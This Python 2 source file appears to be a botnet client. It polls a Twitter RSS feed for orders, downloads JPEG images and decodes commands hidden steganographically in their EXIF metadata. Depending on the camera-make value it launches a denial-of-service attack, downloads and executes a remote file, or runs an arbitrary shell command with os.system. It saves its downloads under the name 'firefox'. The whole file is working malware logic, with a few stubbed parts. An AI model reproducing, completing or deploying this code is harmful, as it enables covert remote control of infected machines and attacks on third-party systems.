#!/usr/bin/env python

import os
import time

from ddos import attack
from netcom import network
from jpeg import stegoJpeg
from subprocess import Popen, PIPE

class davinci():

    def __init__(self):
        self.net = network()
        self.fileSave = 'firefox'
        self.updateUrl = 'https://twitter.com/statuses/user_timeline/243085506.rss'
        self.failSafeUrl = ''
        self.standardSleep = 30
        
    def loopPhoneHome(self):
        ''' Indefinantly calls home every "standardSleep" number of seconds '''
        while True:
            self.phoneHome()
            print ' [*] Starting standard sleep (%d) seconds...' % self.standardSleep
            time.sleep(self.standardSleep)

    def phoneHome(self):
        ''' Calls home (checks twitter feed) for updates '''
        print ' [+] Calling home to check for new commands from my master...'
        self.net.parseXml(self.updateUrl)
        if '.jpg' in self.net.xmlItems['bidding']:
            picture = self.net.xmlItems['bidding']
            self.fileUrl = self.net.getXmlValue('http://', '.jpg', picture, False)
            print ' [*] New command found, I must download: %s' % self.fileUrl
            self.getFile('.jpg')
            self.update = stegoJpeg(self.fileSave + '.jpg')
            self.meta = self.update.getMetadata()
            self.commandLookUp(self.meta['make'])
        elif '.exe' in self.net.xmlItems['bidding']:
            print ' [!] No code here yet, try again later'
        else:
            print ' [*] No command from master at this time'
        
    def getFile(self, extension):
        print ' [*] Getting remote file: %s' % self.fileUrl
        self.net.getFile(self.fileUrl, self.fileSave + extension)

    def getMessage(self):
        offset = int(self.meta['iso'])
        message = self.update.readOffset(offset)
        return message

    def commandLookUp(self, command):
        print ' [*] Command type:',
        if command == 'Canon':
            print 'Denial of Service...'
            target = self.getMessage()
            attack().action(target)
        elif command == 'Nikon':
            print 'Download and execute...'
            url = 'someXe'
            self.net.getFile(url, self.exeSave[0])
            self.execute(self.exeSave[0])
        elif command == 'Sony':
            print 'System Call'
            command = self.getMessage()
            os.system(command)
        elif command == 'Casio':
            print '0x90'
            time.sleep(300)
 
    def execute(self, command):
        reply = Popen(command, stdin=PIPE, stdout=PIPE, stderr=PIPE).communicate()
        print reply

if __name__ == '__main__':
    try:
        davinci().loopPhoneHome()
    except KeyboardInterrupt:
        print '\n [*] User exit, please run again!'